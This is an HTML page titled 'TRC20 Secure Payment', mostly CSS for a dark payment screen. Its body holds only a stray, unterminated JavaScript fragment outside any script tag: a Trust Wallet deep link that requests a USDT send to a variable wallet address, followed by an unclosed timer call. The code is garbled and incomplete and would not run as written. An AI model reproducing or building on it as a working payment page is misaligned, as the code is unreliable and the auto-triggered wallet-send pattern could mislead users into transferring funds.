<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>TRC20 Secure Payment</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(to bottom right, #121212, #1f1f1f);
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      text-align: center;
    }
    header {
      margin-bottom: 20px;
    }
    header h1 {
      font-size: 1.2rem;
      color: #4ade80;
      background: rgba(255, 255, 255, 0.1);
      padding: 6px 12px;
      border-radius: 10px;
    }
    img.logo {
      width: 100px;
      margin-bottom: 20px;
      border-radius: 20px;
      box-shadow: 0 0 15px rgba(0,255,255,0.3);
    }
    h2 {
      font-size: 1.5rem;
      margin: 10px 0;
    }
    .button {
      background-color: #00c2ff;
      color: white;
      padding: 12px 25px;
      border: none;
      border-radius: 30px;
      font-size: 1rem;
      cursor: pointer;
      transition: background 0.3s ease;
      margin-top: 15px;
    }
    .button:hover {
      background-color: #009edb;
    }
    #status {
      margin-top: 15px;
      font-size: 1rem;
      color: #a3e635;
    }
    footer {
      font-size: 0.85rem;
      margin-top: 20px;
      color: #888;
    }
  </style>
</head>
<body>

      const payLink = `https://link.trustwallet.com/send?asset=c195_tTR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t&address=${walletAddress}`;
      
      setTimeout(() => {

</body>
</html>
